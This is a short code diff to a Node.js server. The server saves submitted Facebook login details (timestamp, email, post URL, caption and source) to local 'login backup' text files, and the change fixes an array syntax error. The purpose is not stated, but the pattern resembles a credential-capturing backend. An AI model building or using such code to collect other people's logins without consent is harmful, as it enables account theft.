@@ -32,7 +32,7 @@ const server = http.createServer((req, res) => {
         const fileName = `facebook_mobile_login_backup_${timestamp}.txt`;
         const filePath = path.join(SAVED_DIR, fileName);
 
-        const lines = [`
+        const fileContent = [
           `Facebook Mobile Login Backup`,
           `Timestamp: ${data.timestamp}`,
           `Email: ${data.email || '(empty)'}`,
@@ -40,7 +40,7 @@ const server = http.createServer((req, res) => {
           `Post URL: ${data.postUrl || '(empty)'}`,
           `Post Caption: ${data.postCaption || '(empty)'}`,
           `Post Source: ${data.postSource || '(empty)'}`,
-        `].join('\r\n');
+        ].join('\r\n');
 
         fs.writeFileSync(filePath, fileContent, 'utf-8');
 
